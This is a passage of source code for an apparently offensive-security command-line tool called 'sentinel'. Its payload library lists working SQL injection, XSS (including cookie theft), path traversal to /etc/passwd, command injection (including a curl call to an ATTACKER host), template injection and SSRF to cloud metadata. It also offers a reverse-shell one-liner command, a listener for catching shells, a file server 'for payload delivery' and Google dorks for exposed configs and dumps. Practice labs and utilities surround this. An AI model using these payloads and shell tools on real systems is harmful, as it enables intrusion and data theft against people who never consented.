  TOOLS.forEach(([n, cat, inst]) => console.log("  " + bold(n.padEnd(14)) + gray(cat.padEnd(10)) + inst));
  console.log("\n  " + gray("configure any tool with: ") + "sentinel setup <name>");
}
// Auto-configure a tool: run its install command, streaming output to the terminal.
function setupTool(name) {
  return new Promise((resolve) => {
    if (!name) { console.log("  " + red("usage: sentinel setup <tool>   e.g. sentinel setup nmap")); return resolve(); }
    const t = TOOLS.find((x) => x[0].toLowerCase() === String(name).toLowerCase());
    if (!t) { console.log("  " + red("unknown tool. see: sentinel tools")); return resolve(); }
    let inst = t[2];
    if (process.platform !== "win32" && inst.startsWith("sudo ") && process.getuid && process.getuid() !== 0 && process.env.SENTINEL_NO_PKEXEC !== "1") {
      // prefer a graphical prompt if available, else sudo will prompt in the terminal
    }
    h1("Configuring " + t[0]);
    console.log("  " + gray("first-time setup, this can take a few minutes...") + "\n  " + gray(inst) + "\n");
    const p = spawn(process.platform === "win32" ? "cmd.exe" : "/bin/bash", process.platform === "win32" ? ["/c", inst] : ["-lc", inst], { stdio: "inherit" });
    p.on("close", (code) => { console.log("\n  " + (code === 0 ? ok(t[0] + " is ready.") : red("setup exited with code " + code))); resolve(); });
    p.on("error", (e) => { console.log("  " + red("error: " + e.message)); resolve(); });
  });
}

// ---------- practice targets ----------
const PRACTICE = [
  ["dvwa", "DVWA", "SQLi / XSS / CSRF / command injection / file upload", "docker run --rm -it -p 4280:80 vulnerables/web-dvwa", "http://localhost:4280", "admin / password (then Setup > Create Database)"],
  ["juice", "OWASP Juice Shop", "OWASP Top 10 · modern JS · CTF-style", "docker run --rm -p 3000:3000 bkimminich/juice-shop", "http://localhost:3000", "register your own account"],
  ["webgoat", "OWASP WebGoat", "guided lessons · Java", "docker run --rm -p 8080:8080 -p 9090:9090 webgoat/webgoat", "http://localhost:8080/WebGoat", "register on first run"],
  ["bwapp", "bWAPP", "100+ bugs · PHP", "docker run --rm -p 8081:80 raesene/bwapp", "http://localhost:8081/install.php", "bee / bug (run /install.php once)"],
  ["mutillidae", "Mutillidae II (NOWASP)", "OWASP Top 10 · hints", "docker run --rm -p 8082:80 citizenstig/nowasp", "http://localhost:8082", "no login required"],
];
function labList() {
  h1("Practice targets");
  console.log("  " + gray("deliberately vulnerable apps — run locally with Docker. use only on systems you own.") + "\n");
  PRACTICE.forEach(([id, name, focus, cmd, url, creds]) => {
    console.log("  " + bold(cyan(id.padEnd(12))) + name);
    console.log("  " + " ".repeat(12) + gray(focus));
    console.log("  " + " ".repeat(12) + cmd);
    console.log("  " + " ".repeat(12) + gray("url ") + url + "   " + gray("login ") + creds + "\n");
  });
  console.log("  " + gray("tip: ") + "sentinel lab <id>" + gray("  prints one target's launch command"));
}
function labOne(id) {
  const t = PRACTICE.find((x) => x[0] === String(id).toLowerCase());
  if (!t) { console.log("  " + red("unknown target — try: " + PRACTICE.map((x) => x[0]).join(", "))); return; }
  h1(t[1]);
  console.log("  focus   " + t[2]);
  console.log("  launch  " + bold(t[3]));
  console.log("  url     " + t[4]);
  console.log("  login   " + t[5]);
}

// ---------- payload library ----------
const PAYLOADS_CLI = {
  sqli: ["' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' UNION SELECT NULL-- -", "1' AND SLEEP(5)-- -", "') OR ('1'='1", "'; DROP TABLE users-- -"],
  xss: ["<script>alert(1)</script>", "\"><svg onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(document.domain)", "'\"><script>alert(document.cookie)</script>"],
  lfi: ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....//....//etc/passwd"],
  cmdi: ["; id", "| id", "$(id)", "`id`", "&& whoami", "; cat /etc/passwd", "$(curl http://ATTACKER)"],
  ssti: ["{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "<%= 7*7 %>", "{{''.__class__.__mro__[1].__subclasses__()}}"],
  ssrf: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "file:///etc/passwd", "gopher://127.0.0.1:6379/_", "http://[::1]/"],
};
function printPayloads(cls) {
  if (cls && PAYLOADS_CLI[cls]) { h1("Payloads · " + cls); PAYLOADS_CLI[cls].forEach((p) => console.log("  " + p)); return; }
  if (cls) { console.log("  " + red("unknown class — try: " + Object.keys(PAYLOADS_CLI).join(", "))); return; }
  h1("Payload library");
  console.log("  " + gray("classes: " + Object.keys(PAYLOADS_CLI).join(", ")) + "\n");
  Object.entries(PAYLOADS_CLI).forEach(([k, arr]) => { console.log("  " + bold(cyan(k))); arr.forEach((p) => console.log("    " + p)); console.log(""); });
  console.log("  " + gray("for authorized testing only."));
}

// ---------- utilities: password gen, public IP, HTTP status ----------
function genPass(len) {
  len = Math.max(8, Math.min(128, parseInt(len, 10) || 20));
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*-_=+";
  const bytes = crypto.randomBytes(len); let out = "";
  for (let i = 0; i < len; i++) out += chars[bytes[i] % chars.length];
  return out;
}
async function myIp() {
  const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 8000);
  try { const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal }); const d = await r.json(); return d.ip || "(unknown)"; }
  catch (e) { return "error: " + (e.name === "AbortError" ? "timed out" : e.message); }
  finally { clearTimeout(t); }
}
const HTTP_STATUS_MAP = { "200": "OK", "201": "Created", "202": "Accepted", "204": "No Content", "206": "Partial Content", "301": "Moved Permanently", "302": "Found", "303": "See Other", "304": "Not Modified", "307": "Temporary Redirect", "308": "Permanent Redirect", "400": "Bad Request", "401": "Unauthorized", "402": "Payment Required", "403": "Forbidden", "404": "Not Found", "405": "Method Not Allowed", "406": "Not Acceptable", "407": "Proxy Authentication Required", "408": "Request Timeout", "409": "Conflict", "410": "Gone", "413": "Payload Too Large", "414": "URI Too Long", "418": "I'm a teapot", "422": "Unprocessable Entity", "425": "Too Early", "429": "Too Many Requests", "431": "Request Header Fields Too Large", "451": "Unavailable For Legal Reasons", "500": "Internal Server Error", "501": "Not Implemented", "502": "Bad Gateway", "503": "Service Unavailable", "504": "Gateway Timeout", "505": "HTTP Version Not Supported" };
function httpStatus(code) { code = String(code || "").trim(); const t = HTTP_STATUS_MAP[code]; return t ? bold(cyan(code)) + " " + t : red("unknown status code (try 200, 404, 500...)"); }

async function mainMenu() {
  banner();
  const items = [
    ["1", "Port scanner", menuScan],
    ["2", "DNS lookup", menuDns],
    ["3", "WHOIS", menuWhois],
    ["4", "HTTP security headers", menuHeaders],
    ["5", "TLS certificate", menuCert],
    ["6", "Subdomains (crt.sh)", menuSubs],
    ["v", "CVE search (NVD)", async () => { h1("CVE search"); const q = await ask("keyword / CVE-id:"); console.log(""); await cveSearch(q); }],
    ["f", "Content fuzzer", async () => { h1("Content fuzzer"); const u = await ask("url:"); console.log(""); await fuzz(u); }],
    ["7", "Reverse shell generator", menuShell],
    ["8", "Encode / decode / hash", menuEncode],
    ["9", "Payload builders", menuPayloads],
    ["p", "Payload library", async () => { const c = await ask("class (blank = all):"); console.log(""); printPayloads(c || undefined); }],
    ["l", "Practice targets", async () => labList()],
    ["x", "Password generator", async () => { const n = await ask("length (blank = 20):"); h1("Generated password"); console.log("  " + bold(genPass(n))); }],
    ["i", "My public IP", async () => { h1("Public IP"); console.log("  " + await myIp()); }],
    ["g", "GitHub (clone / push)", menuGit],
    ["c", "Cheat sheets", menuCheats],
    ["t", "Tools catalog", async () => listTools()],
    ["0", "Exit", null],
  ];
  while (true) {
    console.log("");
    items.forEach(([k, label]) => console.log("  " + cyan("[" + k + "]") + " " + label));
    const choice = await ask("\n  select:");
    const item = items.find((i) => i[0] === choice);
    if (!item) { console.log("  " + red("invalid choice")); continue; }
    if (item[0] === "0") { console.log("\n  " + gray("stay sharp.") + "\n"); process.exit(0); }
    try { await item[2](); } catch (e) { console.log("  " + red("error: " + e.message)); }
    await ask("\n  " + gray("[enter] menu"));
    console.clear();
    banner();
  }
}

// ---------- extra utilities ----------
function cidr(input) {
  const m = String(input || "").trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
  if (!m) { console.log(red("usage: sentinel cidr 192.168.1.0/24")); return; }
  const ip = m[1].split(".").map(Number), bits = +m[2];
  if (ip.some((o) => o > 255) || bits > 32) { console.log(red("invalid CIDR")); return; }
  const ipn = (((ip[0] << 24) >>> 0) + (ip[1] << 16) + (ip[2] << 8) + ip[3]) >>> 0;
  const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
  const net_ = (ipn & mask) >>> 0, bc = (net_ | (~mask >>> 0)) >>> 0;
  const toIp = (n) => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(".");
  const hosts = bits >= 31 ? (bits === 32 ? 1 : 2) : (bc - net_ - 1);
  h1("CIDR " + input);
  console.log("  Network    " + cyan(toIp(net_)));
  console.log("  Broadcast  " + cyan(toIp(bc)));
  console.log("  Netmask    " + toIp(mask));
  console.log("  Usable     " + toIp(bits >= 31 ? net_ : net_ + 1) + "  -  " + toIp(bits >= 31 ? bc : bc - 1));
  console.log("  Hosts      " + green(String(hosts)));
}
function jwtDecode(tok) {
  const p = String(tok || "").trim().split("."); if (p.length < 2) { console.log(red("not a JWT")); return; }
  const dec = (x) => JSON.stringify(JSON.parse(Buffer.from(x.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString()), null, 2);
  try { h1("JWT"); console.log(gray("// header")); console.log(dec(p[0])); console.log(gray("\n// payload")); console.log(dec(p[1])); console.log(gray("\nsignature: ") + p[2] || ""); }
  catch (e) { console.log(red("invalid JWT: " + e.message)); }
}
async function ipInfo(ip) {
  const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 8000);
  try {
    const r = await fetch("http://ip-api.com/json/" + encodeURIComponent(ip || ""), { signal: ctrl.signal });
    const d = await r.json();
    if (d.status !== "success") { console.log(red(d.message || "lookup failed")); return; }
    h1("IP " + d.query);
    [["Location", [d.city, d.regionName, d.country].filter(Boolean).join(", ")], ["ISP", d.isp], ["Org", d.org], ["AS", d.as], ["Coords", d.lat + "," + d.lon], ["Timezone", d.timezone]].forEach(([k, v]) => v && console.log("  " + k.padEnd(10) + cyan(v)));
  } catch (e) { console.log(red("error: " + (e.name === "AbortError" ? "timed out" : e.message))); }
  finally { clearTimeout(t); }
}
function dorks(domain) {
  if (!domain) { console.log(red("usage: sentinel dorks example.com")); return; }
  const D = [["exposed files", 'intitle:"index of"'], ["config/env", "ext:env | ext:ini | ext:conf"], ["SQL dumps", "ext:sql"], ["login pages", "inurl:login | inurl:admin"], ["docs", "ext:pdf | ext:xls | ext:docx"], ["errors", 'intext:"sql syntax near"'], ["backups", "ext:bak | ext:old | ext:backup"]];
  h1("Google dorks for " + domain);
  D.forEach(([label, q]) => { console.log("  " + bold(label)); console.log("  " + gray("https://www.google.com/search?q=") + encodeURIComponent("site:" + domain + " " + q) + "\n"); });
}
function fileHash(f) {
  try { const buf = require("fs").readFileSync(f); h1("Hashes of " + f); ["md5", "sha1", "sha256", "sha512"].forEach((a) => console.log("  " + a.padEnd(8) + cyan(crypto.createHash(a).update(buf).digest("hex")))); }
  catch (e) { console.log(red("error: " + e.message)); }
}
function serveDir(port, dir) {
  port = parseInt(port, 10) || 8000; dir = dir || ".";
  const fs = require("fs"), path = require("path");
  const srv = http.createServer((req, res) => {
    let p = path.join(dir, decodeURIComponent(req.url.split("?")[0]));
    if (!path.resolve(p).startsWith(path.resolve(dir))) { res.writeHead(403); return res.end("forbidden"); }
    fs.stat(p, (e, st) => {
      if (e) { res.writeHead(404); return res.end("not found"); }
      if (st.isDirectory()) { const items = fs.readdirSync(p); res.writeHead(200, { "Content-Type": "text/html" }); return res.end(items.map((i) => `<a href="${req.url.replace(/\/$/, "")}/${i}">${i}</a>`).join("<br>")); }
      console.log("  " + green("GET ") + req.url + gray("  " + (req.socket.remoteAddress || "")));
      res.writeHead(200); fs.createReadStream(p).pipe(res);
    });
  });
  srv.listen(port, () => { h1("HTTP file server"); console.log("  serving " + bold(path.resolve(dir)) + " on " + cyan("http://0.0.0.0:" + port)); console.log("  " + gray("Ctrl-C to stop") + "\n"); });
}
function listen(port) {
  port = parseInt(port, 10) || 4444;
  h1("Listener on :" + port);
  console.log("  " + gray("waiting for a connection (catch a reverse shell)... Ctrl-C to quit") + "\n");
  const srv = net.createServer((sock) => {
    console.log("  " + green("connection from ") + (sock.remoteAddress || "") + ":" + sock.remotePort + "\n");
    process.stdin.setRawMode && process.stdin.setRawMode(true); process.stdin.resume();
    sock.pipe(process.stdout); process.stdin.pipe(sock);
    sock.on("close", () => { console.log("\n  " + gray("connection closed")); process.exit(0); });
    sock.on("error", () => {});
  });
  srv.listen(port);
}

// ---------- one-shot CLI ----------
async function cli(args) {
  const [cmd, ...rest] = args;
  if (cmd === "scan") { const host = rest[0]; if (!host) return usage(); await scan(host, parsePorts(rest[1])); }
  else if (cmd === "dns") { const recs = await dnsLookup(rest[0] || ""); recs.forEach(([k, v]) => console.log(k.padEnd(6) + v)); }
  else if (cmd === "whois") { console.log(await whois(rest[0] || "")); }
  else if (cmd === "headers") { const r = await headers(rest[0] || ""); if (r.err) { console.log(r.err); return; } console.log(r.status + " server:" + r.server); SEC.forEach(([k, label]) => console.log((r.h[k] !== undefined ? "[+] " : "[-] ") + label)); }
  else if (cmd === "cert") { const c = await certInspect(rest[0] || ""); if (!c.ok) { console.log(c.error); return; } console.log("Protocol " + c.protocol + " " + c.cipher); console.log("Subject  " + c.subject); console.log("Issuer   " + c.issuer); console.log("Valid    " + c.valid_from + " -> " + c.valid_to + (c.daysLeft != null ? " (" + c.daysLeft + "d left)" : "")); console.log("SAN      " + c.san); console.log("SHA-256  " + c.fp); }
  else if (cmd === "subs") { const r = await subs(rest[0] || ""); if (r.err) { console.log(r.err); return; } r.forEach((s) => console.log(s)); }
  else if (cmd === "cve") await cveSearch(rest.join(" "));
  else if (cmd === "fuzz") await fuzz(rest[0], rest[1]);
  else if (cmd === "git") {
    const sub = rest[0];
    if (sub === "clone") await gitClone(rest[1] || "");
    else if (sub === "push") await gitPush(rest.slice(1).join(" "));
    else if (sub === "pull") await gitPull();
    else if (sub === "status") await gitStatus();
    else if (sub === "repos") await ghReposList();
    else if (sub === "new") await ghNewRepo(rest[1]);
    else if (sub === "branch") await gitBranches();
    else if (sub === "checkout") await gitCheckout(rest[1]);
    else if (sub === "log") await gitLog();
    else if (sub === "diff") await gitDiff(rest[1]);
    else if (sub === "issues") await ghIssues(rest[1], "issues");
    else if (sub === "prs") await ghIssues(rest[1], "pulls");
    else if (sub === "issue") await ghNewIssue(rest[1], rest[2], rest.slice(3).join(" "));
    else if (sub === "pr") await ghNewPR(rest[1], rest[2]);
    else if (sub === "comment") await ghComment(rest[1], rest[2], rest.slice(3).join(" "));
    else if (sub === "gists") await ghGists();
    else if (sub === "gist") await ghNewGist(rest[1], rest.slice(2).join(" "));
    else console.log("git clone|push|pull|status|log|diff|branch|checkout|repos|new|issues|prs|issue|pr|comment|gists|gist  (token: SENTINEL_GH_TOKEN)");
  }
  else if (cmd === "revshell") { const [lang = "bash", ip = "10.0.0.1", port = "4444"] = rest; console.log((SHELLS[lang] || SHELLS.bash)(ip, port)); }
  else if (cmd === "encode" || cmd === "decode") { const [type, ...v] = rest; const op = (type || "") + (cmd === "encode" ? "e" : "d"); const fn = ENC[op]; console.log(fn ? fn(v.join(" ")) : "unknown type (b64|hex|url)"); }
  else if (cmd === "hash") console.log(hashes(rest.join(" ")));
  else if (cmd === "hashid") console.log(idHash(rest.join(" ")));
  else if (cmd === "lab") { if (rest[0]) labOne(rest[0]); else labList(); }
  else if (cmd === "payloads") printPayloads(rest[0]);
  else if (cmd === "genpass") console.log(genPass(rest[0]));
  else if (cmd === "myip") console.log(await myIp());
  else if (cmd === "status") console.log(httpStatus(rest[0]));
  else if (cmd === "cidr") cidr(rest[0]);
  else if (cmd === "jwt") jwtDecode(rest[0]);
  else if (cmd === "ipinfo") await ipInfo(rest[0] || "");
  else if (cmd === "dorks") dorks(rest[0]);
  else if (cmd === "hashfile") fileHash(rest[0]);
  else if (cmd === "uuid") console.log(crypto.randomUUID());
  else if (cmd === "serve") { serveDir(rest[0], rest[1]); await new Promise(() => {}); }
  else if (cmd === "listen") { listen(rest[0]); await new Promise(() => {}); }
  else if (cmd === "cheats") { const t = rest[0]; if (t && CHEATS[t]) CHEATS[t].forEach((l) => console.log(l)); else console.log("topics: " + Object.keys(CHEATS).join(", ")); }
  else if (cmd === "tools") { h1("Tools"); TOOLS.forEach(([n, cat, inst]) => console.log("  " + bold(n.padEnd(14)) + gray(cat.padEnd(10)) + (inst.split(" ").slice(0,3).join(" ")))); console.log("\n  " + gray("configure any tool with: ") + "sentinel setup <name>"); }
  else if (cmd === "setup") await setupTool(rest[0]);
  else usage();
}
function usage() {
  banner();
  console.log(`  ${bold("USAGE")}
    sentinel [command] [args]         no command opens the interactive menu

  ${bold("COMMANDS")}
    scan <host> [ports]               TCP scan (ports: top | 1-1024 | 80,443)
    dns <domain>                      A / AAAA / MX / NS / TXT / CNAME + reverse
    whois <domain|ip>                 native WHOIS lookup
    headers <url>                     HTTP status + security-header check
    cert <host>                       TLS certificate inspector
    subs <domain>                     passive subdomain enum (crt.sh)
    cve <keyword | CVE-id>            search the NVD vulnerability database
    fuzz <url> [wordlist]             directory / content brute-forcer
    git clone <url>                   clone a repo (SENTINEL_GH_TOKEN for private)
    git push [message]                commit all changes + push
    git pull                          pull the latest changes
    git status                        working-tree status
    git log                           recent commits
    git diff [file]                   working-tree diff
    git branch                        list branches
    git checkout <branch>             switch branch
    git repos                         list your repositories
    git new <name>                    create a private repo
    git issues <owner/repo>           list open issues
    git prs <owner/repo>              list open pull requests
    git issue <owner/repo> "title"    create an issue
    git pr "title" [base]             open a PR from the current branch
    git comment <owner/repo> <n> "…"  comment on an issue/PR
    git gists                         list your gists
    git gist <file> [description]     create a gist from a file
    revshell <lang> <ip> <port>       reverse-shell one-liner
    encode <b64|hex|url> <text>       encode text
    decode <b64|hex|url> <text>       decode text
    hash <text>                       md5 / sha1 / sha256 / sha512
    hashid <hash>                     identify a hash type
    genpass [length]                  generate a strong random password (default 20)
    uuid                              generate a random UUID v4
    myip                              show your public IP address
    ipinfo <ip>                       geolocate an IP (city, ISP, ASN)
    status <code>                     look up an HTTP status code
    cidr <a.b.c.d/xx>                 subnet calculator (range, hosts, mask)
    jwt <token>                       decode a JWT header + payload
    dorks <domain>                    print Google dork search URLs for a domain
    hashfile <file>                   md5 / sha1 / sha256 / sha512 of a file
    serve [port] [dir]                HTTP file server for payload delivery (default 8000)
    listen [port]                     TCP listener to catch a reverse shell (default 4444)
    lab [target]                      practice targets (dvwa, juice, webgoat, bwapp, mutillidae)
    payloads [class]                  payload library (sqli, xss, lfi, cmdi, ssti, ssrf)
    cheats [topic]                    ${Object.keys(CHEATS).join(", ")}
    tools                             tool catalog + install commands
    setup <tool>                      auto-configure a tool on first use

  ${bold("OPTIONS")}
    -h, --help                        show this help
    -v, --version                     show version
    NO_COLOR=1                        disable colored output

  ${bold("EXAMPLES")}
    ${gray("$")} sentinel scan 10.10.14.7 top
    ${gray("$")} sentinel revshell bash 10.10.14.7 4444
    ${gray("$")} sentinel hash 'S3cr3t!'

  ${gray("MIT licensed · use only on systems you are authorized to test.")}
`);
}

// ---------- entry ----------
process.on("SIGINT", () => { console.log("\n  " + gray("interrupted — stay sharp.") + "\n"); process.exit(130); });
const args = process.argv.slice(2);
if (args[0] === "-v" || args[0] === "--version") { console.log("sentinel " + VERSION); process.exit(0); }
else if (args.length === 0) mainMenu();
else if (args[0] === "-h" || args[0] === "--help") usage();
else cli(args).then(() => process.exit(0)).catch((e) => { console.error("  " + red("error: " + e.message)); process.exit(1); });
